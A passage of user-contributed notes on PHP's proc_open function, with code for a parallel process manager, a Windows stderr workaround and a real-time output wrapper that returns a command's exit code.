prints:<br />
foo<br />
<br />
but this doesn't work:<br />
<br />
<span class="default">&lt;?php<br />
proc_open</span><span class="keyword">(</span><span class="string">"echo foo"</span><span class="keyword">,<br />
&nbsp; array(<br />
&nbsp;&nbsp;&nbsp; array(</span><span class="string">"pipe"</span><span class="keyword">,</span><span class="string">"r"</span><span class="keyword">),<br />
&nbsp;&nbsp;&nbsp; array(</span><span class="string">"pipe"</span><span class="keyword">,</span><span class="string">"w"</span><span class="keyword">),<br />
&nbsp;&nbsp;&nbsp; array(</span><span class="string">"pipe"</span><span class="keyword">,</span><span class="string">"w"</span><span class="keyword">)<br />
&nbsp; ),<br />
&nbsp; </span><span class="default">$pipes</span><span class="keyword">);<br />
print </span><span class="default">stream_get_contents</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">]);<br />
</span><span class="default">?&gt;<br />
</span><br />
outputs:<br />
Warning: stream_get_contents(): &lt;n&gt; is not a valid stream resource in Command line code on line 1<br />
<br />
The only difference is that in the second case we don't save the output of proc_open to a variable.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="97329""></a>
  <div class="note">
   <strong class="user">Matou Havlena - matous at havlena dot net</strong>
   <a href="#97329" class="date">14-Apr-2010 01:03</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
There is some smart object Processes Manager which i have created for my application. It can control the maximum of simultaneously running processes.<br />
<br />
Proccesmanager class:<br />
<span class="default">&lt;?php <br />
</span><span class="keyword">class </span><span class="default">Processmanager </span><span class="keyword">{<br />
&nbsp;&nbsp;&nbsp; public </span><span class="default">$executable </span><span class="keyword">= </span><span class="string">"C:\\www\\_PHP5_2_10\\php"</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; public </span><span class="default">$root </span><span class="keyword">= </span><span class="string">"C:\\www\\parallelprocesses\\"</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; public </span><span class="default">$scripts </span><span class="keyword">= array();<br />
&nbsp;&nbsp;&nbsp; public </span><span class="default">$processesRunning </span><span class="keyword">= </span><span class="default">0</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; public </span><span class="default">$processes </span><span class="keyword">= </span><span class="default">3</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; public </span><span class="default">$running </span><span class="keyword">= array();<br />
&nbsp;&nbsp;&nbsp; public </span><span class="default">$sleep_time </span><span class="keyword">= </span><span class="default">2</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; function </span><span class="default">addScript</span><span class="keyword">(</span><span class="default">$script</span><span class="keyword">, </span><span class="default">$max_execution_time </span><span class="keyword">= </span><span class="default">300</span><span class="keyword">) {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">scripts</span><span class="keyword">[] = array(</span><span class="string">"script_name" </span><span class="keyword">=&gt; </span><span class="default">$script</span><span class="keyword">,<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="string">"max_execution_time" </span><span class="keyword">=&gt; </span><span class="default">$max_execution_time</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; function </span><span class="default">exec</span><span class="keyword">() {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$i </span><span class="keyword">= </span><span class="default">0</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; for(;;) {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="comment">// Fill up the slots<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="keyword">while ((</span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">processesRunning</span><span class="keyword">&lt;</span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">processes</span><span class="keyword">) and (</span><span class="default">$i</span><span class="keyword">&lt;</span><span class="default">count</span><span class="keyword">(</span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">scripts</span><span class="keyword">))) {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; echo </span><span class="string">"&lt;span style='color: orange;'&gt;Adding script: "</span><span class="keyword">.</span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">scripts</span><span class="keyword">[</span><span class="default">$i</span><span class="keyword">][</span><span class="string">"script_name"</span><span class="keyword">].</span><span class="string">"&lt;/span&gt;&lt;br /&gt;"</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">ob_flush</span><span class="keyword">();<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">flush</span><span class="keyword">();<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">running</span><span class="keyword">[] =&amp; new </span><span class="default">Process</span><span class="keyword">(</span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">executable</span><span class="keyword">, </span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">root</span><span class="keyword">, </span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">scripts</span><span class="keyword">[</span><span class="default">$i</span><span class="keyword">][</span><span class="string">"script_name"</span><span class="keyword">], </span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">scripts</span><span class="keyword">[</span><span class="default">$i</span><span class="keyword">][</span><span class="string">"max_execution_time"</span><span class="keyword">]);<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">processesRunning</span><span class="keyword">++;<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$i</span><span class="keyword">++;<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; <br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="comment">// Check if done<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="keyword">if ((</span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">processesRunning</span><span class="keyword">==</span><span class="default">0</span><span class="keyword">) and (</span><span class="default">$i</span><span class="keyword">&gt;=</span><span class="default">count</span><span class="keyword">(</span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">scripts</span><span class="keyword">))) {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; break;<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="comment">// sleep, this duration depends on your script execution time, the longer execution time, the longer sleep time<br />
&nbsp;&nbsp; &nbsp;&nbsp; </span><span class="default">sleep</span><span class="keyword">(</span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">sleep_time</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp;&nbsp; <br />
&nbsp;&nbsp; &nbsp;&nbsp; </span><span class="comment">// check what is done<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="keyword">foreach (</span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">running </span><span class="keyword">as </span><span class="default">$key </span><span class="keyword">=&gt; </span><span class="default">$val</span><span class="keyword">) {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; if (!</span><span class="default">$val</span><span class="keyword">-&gt;</span><span class="default">isRunning</span><span class="keyword">() or </span><span class="default">$val</span><span class="keyword">-&gt;</span><span class="default">isOverExecuted</span><span class="keyword">()) {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; if (!</span><span class="default">$val</span><span class="keyword">-&gt;</span><span class="default">isRunning</span><span class="keyword">()) echo </span><span class="string">"&lt;span style='color: green;'&gt;Done: "</span><span class="keyword">.</span><span class="default">$val</span><span class="keyword">-&gt;</span><span class="default">script</span><span class="keyword">.</span><span class="string">"&lt;/span&gt;&lt;br /&gt;"</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; else echo </span><span class="string">"&lt;span style='color: red;'&gt;Killed: "</span><span class="keyword">.</span><span class="default">$val</span><span class="keyword">-&gt;</span><span class="default">script</span><span class="keyword">.</span><span class="string">"&lt;/span&gt;&lt;br /&gt;"</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">proc_close</span><span class="keyword">(</span><span class="default">$val</span><span class="keyword">-&gt;</span><span class="default">resource</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; unset(</span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">running</span><span class="keyword">[</span><span class="default">$key</span><span class="keyword">]);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">processesRunning</span><span class="keyword">--;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">ob_flush</span><span class="keyword">();<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">flush</span><span class="keyword">();<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; }<br />
}<br />
</span><span class="default">?&gt;<br />
</span><br />
Process class:<br />
<span class="default">&lt;?php<br />
</span><span class="keyword">class </span><span class="default">Process </span><span class="keyword">{<br />
&nbsp;&nbsp;&nbsp; public </span><span class="default">$resource</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; public </span><span class="default">$pipes</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; public </span><span class="default">$script</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; public </span><span class="default">$max_execution_time</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; public </span><span class="default">$start_time</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; function </span><span class="default">__construct</span><span class="keyword">(&amp;</span><span class="default">$executable</span><span class="keyword">, &amp;</span><span class="default">$root</span><span class="keyword">, </span><span class="default">$script</span><span class="keyword">, </span><span class="default">$max_execution_time</span><span class="keyword">) {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">script </span><span class="keyword">= </span><span class="default">$script</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">max_execution_time </span><span class="keyword">= </span><span class="default">$max_execution_time</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$descriptorspec&nbsp; &nbsp; </span><span class="keyword">= array(<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">0 </span><span class="keyword">=&gt; array(</span><span class="string">'pipe'</span><span class="keyword">, </span><span class="string">'r'</span><span class="keyword">),<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">1 </span><span class="keyword">=&gt; array(</span><span class="string">'pipe'</span><span class="keyword">, </span><span class="string">'w'</span><span class="keyword">),<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">2 </span><span class="keyword">=&gt; array(</span><span class="string">'pipe'</span><span class="keyword">, </span><span class="string">'w'</span><span class="keyword">)<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; );<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">resource&nbsp; &nbsp; </span><span class="keyword">= </span><span class="default">proc_open</span><span class="keyword">(</span><span class="default">$executable</span><span class="keyword">.</span><span class="string">" "</span><span class="keyword">.</span><span class="default">$root</span><span class="keyword">.</span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">script</span><span class="keyword">, </span><span class="default">$descriptorspec</span><span class="keyword">, </span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">pipes</span><span class="keyword">, </span><span class="default">null</span><span class="keyword">, </span><span class="default">$_ENV</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">start_time </span><span class="keyword">= </span><span class="default">mktime</span><span class="keyword">();<br />
&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; </span><span class="comment">// is still running?<br />
&nbsp;&nbsp;&nbsp; </span><span class="keyword">function </span><span class="default">isRunning</span><span class="keyword">() {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$status </span><span class="keyword">= </span><span class="default">proc_get_status</span><span class="keyword">(</span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">resource</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; return </span><span class="default">$status</span><span class="keyword">[</span><span class="string">"running"</span><span class="keyword">];<br />
&nbsp;&nbsp;&nbsp; }<br />
<br />
&nbsp;&nbsp;&nbsp; </span><span class="comment">// long execution time, proccess is going to be killer<br />
&nbsp;&nbsp;&nbsp; </span><span class="keyword">function </span><span class="default">isOverExecuted</span><span class="keyword">() {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; if (</span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">start_time</span><span class="keyword">+</span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">max_execution_time</span><span class="keyword">&lt;</span><span class="default">mktime</span><span class="keyword">()) return </span><span class="default">true</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; else return </span><span class="default">false</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; }<br />
<br />
}<br />
</span><span class="default">?&gt;<br />
</span><br />
Example of using:<br />
<span class="default">&lt;?php<br />
$manager </span><span class="keyword">= new </span><span class="default">Processmanager</span><span class="keyword">();<br />
</span><span class="default">$manager</span><span class="keyword">-&gt;</span><span class="default">executable </span><span class="keyword">= </span><span class="string">"C:\\www\\_PHP5_2_10\\php"</span><span class="keyword">;<br />
</span><span class="default">$manager</span><span class="keyword">-&gt;</span><span class="default">path </span><span class="keyword">= </span><span class="string">"C:\\www\\parallelprocesses\\"</span><span class="keyword">;<br />
</span><span class="default">$manager</span><span class="keyword">-&gt;</span><span class="default">processes </span><span class="keyword">= </span><span class="default">3</span><span class="keyword">;<br />
</span><span class="default">$manager</span><span class="keyword">-&gt;</span><span class="default">sleep_time </span><span class="keyword">= </span><span class="default">2</span><span class="keyword">;<br />
</span><span class="default">$manager</span><span class="keyword">-&gt;</span><span class="default">addScript</span><span class="keyword">(</span><span class="string">"script1.php"</span><span class="keyword">, </span><span class="default">10</span><span class="keyword">);<br />
</span><span class="default">$manager</span><span class="keyword">-&gt;</span><span class="default">addScript</span><span class="keyword">(</span><span class="string">"script2.php"</span><span class="keyword">);<br />
</span><span class="default">$manager</span><span class="keyword">-&gt;</span><span class="default">addScript</span><span class="keyword">(</span><span class="string">"script3.php"</span><span class="keyword">);<br />
</span><span class="default">$manager</span><span class="keyword">-&gt;</span><span class="default">addScript</span><span class="keyword">(</span><span class="string">"script4.php"</span><span class="keyword">);<br />
</span><span class="default">$manager</span><span class="keyword">-&gt;</span><span class="default">addScript</span><span class="keyword">(</span><span class="string">"script5.php"</span><span class="keyword">);<br />
</span><span class="default">$manager</span><span class="keyword">-&gt;</span><span class="default">addScript</span><span class="keyword">(</span><span class="string">"script6.php"</span><span class="keyword">);<br />
</span><span class="default">$manager</span><span class="keyword">-&gt;</span><span class="default">exec</span><span class="keyword">();<br />
</span><span class="default">?&gt;<br />
</span><br />
And possible output:<br />
<br />
Adding script: script1.php<br />
Adding script: script2.php<br />
Adding script: script3.php<br />
Done: script2.php<br />
Adding script: script4.php<br />
Killed: script1.php<br />
Done: script3.php<br />
Done: script4.php<br />
Adding script: script5.php<br />
Adding script: script6.php<br />
Done: script5.php<br />
Done: script6.php</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="97012""></a>
  <div class="note">
   <strong class="user">Luceo</strong>
   <a href="#97012" class="date">28-Mar-2010 07:39</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
It seems that stream_get_contents() on STDOUT blocks infinitly under Windows when STDERR is filled under some circumstances.<br />
<br />
The trick is to open STDERR in append mode ("a"), then this will work, too.<br />
<br />
<span class="default">&lt;?php<br />
$descriptorspec </span><span class="keyword">= array(<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">0 </span><span class="keyword">=&gt; array(</span><span class="string">'pipe'</span><span class="keyword">, </span><span class="string">'r'</span><span class="keyword">), </span><span class="comment">// stdin<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">1 </span><span class="keyword">=&gt; array(</span><span class="string">'pipe'</span><span class="keyword">, </span><span class="string">'w'</span><span class="keyword">), </span><span class="comment">// stdout<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">2 </span><span class="keyword">=&gt; array(</span><span class="string">'pipe'</span><span class="keyword">, </span><span class="string">'a'</span><span class="keyword">) </span><span class="comment">// stderr<br />
</span><span class="keyword">);<br />
</span><span class="default">?&gt;</span>
</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="95207""></a>
  <div class="note">
   <strong class="user">cbn at grenet dot org</strong>
   <a href="#95207" class="date">18-Dec-2009 07:30</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
Display output (stdout/stderr) in real time, and get the real exit code in pure PHP (no shell workaround!). It works well on my machines (debian mostly).<br />
<br />
#!/usr/bin/php<br />
<span class="default">&lt;?php<br />
</span><span class="comment">/*<br />
&nbsp;* Execute and display the output in real time (stdout + stderr).<br />
&nbsp;*<br />
&nbsp;* Please note this snippet is prepended with an appropriate shebang for the <br />
&nbsp;* CLI. You can re-use only the function.<br />
&nbsp;* <br />
&nbsp;* Usage example:<br />
&nbsp;* chmod u+x proc_open.php<br />
&nbsp;* ./proc_open.php "ping -c 5 google.fr"; echo RetVal=$?<br />
&nbsp;*/<br />
</span><span class="default">define</span><span class="keyword">(</span><span class="default">BUF_SIZ</span><span class="keyword">, </span><span class="default">1024</span><span class="keyword">);&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="comment"># max buffer size<br />
</span><span class="default">define</span><span class="keyword">(</span><span class="default">FD_WRITE</span><span class="keyword">, </span><span class="default">0</span><span class="keyword">);&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="comment"># stdin<br />
</span><span class="default">define</span><span class="keyword">(</span><span class="default">FD_READ</span><span class="keyword">, </span><span class="default">1</span><span class="keyword">);&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="comment"># stdout<br />
</span><span class="default">define</span><span class="keyword">(</span><span class="default">FD_ERR</span><span class="keyword">, </span><span class="default">2</span><span class="keyword">);&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="comment"># stderr<br />
<br />
/*<br />
&nbsp;* Wrapper for proc_*() functions.<br />
&nbsp;* The first parameter $cmd is the command line to execute.<br />
&nbsp;* Return the exit code of the process.<br />
&nbsp;*/<br />
</span><span class="keyword">function </span><span class="default">proc_exec</span><span class="keyword">(</span><span class="default">$cmd</span><span class="keyword">)<br />
{<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$descriptorspec </span><span class="keyword">= array(<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">0 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"r"</span><span class="keyword">),<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">1 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"w"</span><span class="keyword">),<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">2 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"w"</span><span class="keyword">)<br />
&nbsp;&nbsp;&nbsp; );<br />
<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$ptr </span><span class="keyword">= </span><span class="default">proc_open</span><span class="keyword">(</span><span class="default">$cmd</span><span class="keyword">, </span><span class="default">$descriptorspec</span><span class="keyword">, </span><span class="default">$pipes</span><span class="keyword">, </span><span class="default">NULL</span><span class="keyword">, </span><span class="default">$_ENV</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; if (!</span><span class="default">is_resource</span><span class="keyword">(</span><span class="default">$ptr</span><span class="keyword">))<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; return </span><span class="default">false</span><span class="keyword">;<br />
<br />
&nbsp;&nbsp;&nbsp; while ((</span><span class="default">$buffer </span><span class="keyword">= </span><span class="default">fgets</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">FD_READ</span><span class="keyword">], </span><span class="default">BUF_SIZ</span><span class="keyword">)) != </span><span class="default">NULL <br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="keyword">|| (</span><span class="default">$errbuf </span><span class="keyword">= </span><span class="default">fgets</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">FD_ERR</span><span class="keyword">], </span><span class="default">BUF_SIZ</span><span class="keyword">)) != </span><span class="default">NULL</span><span class="keyword">) {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; if (!isset(</span><span class="default">$flag</span><span class="keyword">)) {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$pstatus </span><span class="keyword">= </span><span class="default">proc_get_status</span><span class="keyword">(</span><span class="default">$ptr</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$first_exitcode </span><span class="keyword">= </span><span class="default">$pstatus</span><span class="keyword">[</span><span class="string">"exitcode"</span><span class="keyword">];<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$flag </span><span class="keyword">= </span><span class="default">true</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; if (</span><span class="default">strlen</span><span class="keyword">(</span><span class="default">$buffer</span><span class="keyword">))<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; echo </span><span class="default">$buffer</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; if (</span><span class="default">strlen</span><span class="keyword">(</span><span class="default">$errbuf</span><span class="keyword">))<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; echo </span><span class="string">"ERR: " </span><span class="keyword">. </span><span class="default">$errbuf</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; }<br />
<br />
&nbsp;&nbsp;&nbsp; foreach (</span><span class="default">$pipes </span><span class="keyword">as </span><span class="default">$pipe</span><span class="keyword">)<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$pipe</span><span class="keyword">);<br />
<br />
&nbsp;&nbsp;&nbsp; </span><span class="comment">/* Get the expected *exit* code to return the value */<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$pstatus </span><span class="keyword">= </span><span class="default">proc_get_status</span><span class="keyword">(</span><span class="default">$ptr</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; if (!</span><span class="default">strlen</span><span class="keyword">(</span><span class="default">$pstatus</span><span class="keyword">[</span><span class="string">"exitcode"</span><span class="keyword">]) || </span><span class="default">$pstatus</span><span class="keyword">[</span><span class="string">"running"</span><span class="keyword">]) {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="comment">/* we can trust the retval of proc_close() */<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="keyword">if (</span><span class="default">$pstatus</span><span class="keyword">[</span><span class="string">"running"</span><span class="keyword">])<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">proc_terminate</span><span class="keyword">(</span><span class="default">$ptr</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$ret </span><span class="keyword">= </span><span class="default">proc_close</span><span class="keyword">(</span><span class="default">$ptr</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; } else {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; if (((</span><span class="default">$first_exitcode </span><span class="keyword">+ </span><span class="default">256</span><span class="keyword">) % </span><span class="default">256</span><span class="keyword">) == </span><span class="default">255 <br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="keyword">&amp;&amp; ((</span><span class="default">$pstatus</span><span class="keyword">[</span><span class="string">"exitcode"</span><span class="keyword">] + </span><span class="default">256</span><span class="keyword">) % </span><span class="default">256</span><span class="keyword">) != </span><span class="default">255</span><span class="keyword">)<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$ret </span><span class="keyword">= </span><span class="default">$pstatus</span><span class="keyword">[</span><span class="string">"exitcode"</span><span class="keyword">];<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; elseif (!</span><span class="default">strlen</span><span class="keyword">(</span><span class="default">$first_exitcode</span><span class="keyword">))<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$ret </span><span class="keyword">= </span><span class="default">$pstatus</span><span class="keyword">[</span><span class="string">"exitcode"</span><span class="keyword">];<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; elseif (((</span><span class="default">$first_exitcode </span><span class="keyword">+ </span><span class="default">256</span><span class="keyword">) % </span><span class="default">256</span><span class="keyword">) != </span><span class="default">255</span><span class="keyword">)<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$ret </span><span class="keyword">= </span><span class="default">$first_exitcode</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; else<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$ret </span><span class="keyword">= </span><span class="default">0</span><span class="keyword">; </span><span class="comment">/* we "deduce" an EXIT_SUCCESS ;) */<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">proc_close</span><span class="keyword">(</span><span class="default">$ptr</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; }<br />
<br />
&nbsp;&nbsp;&nbsp; return (</span><span class="default">$ret </span><span class="keyword">+ </span><span class="default">256</span><span class="keyword">) % </span><span class="default">256</span><span class="keyword">;<br />
}<br />
<br />
</span><span class="comment">/* __init__ */<br />
</span><span class="keyword">if (isset(</span><span class="default">$argv</span><span class="keyword">) &amp;&amp; </span><span class="default">count</span><span class="keyword">(</span><span class="default">$argv</span><span class="keyword">) &gt; </span><span class="default">1 </span><span class="keyword">&amp;&amp; !empty(</span><span class="default">$argv</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">])) {<br />
&nbsp;&nbsp;&nbsp; if ((</span><span class="default">$ret </span><span class="keyword">= </span><span class="default">proc_exec</span><span class="keyword">(</span><span class="default">$argv</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">])) === </span><span class="default">false</span><span class="keyword">)<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; die(</span><span class="string">"Error: not enough FD or out of memory.\n"</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; elseif (</span><span class="default">$ret </span><span class="keyword">== </span><span class="default">127</span><span class="keyword">)<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; die(</span><span class="string">"Command not found (returned by sh).\n"</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; else<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; exit(</span><span class="default">$ret</span><span class="keyword">);<br />
}<br />
</span><span class="default">?&gt;</span>
</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="89338""></a>
  <div class="note">
   <strong class="user">simeonl at dbc dot co dot nz</strong>
   <a href="#89338" class="date">03-Mar-2009 06:39</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
Note that when you call an external script and retrieve large amounts of data from STDOUT and STDERR, you may need to retrieve from both alternately in non-blocking mode (with appropriate pauses if no data is retrieved), so that your PHP script doesn't lock up. This can happen if you waiting on activity on one pipe while the external script is waiting for you to empty the other, e.g:<br />
<br />
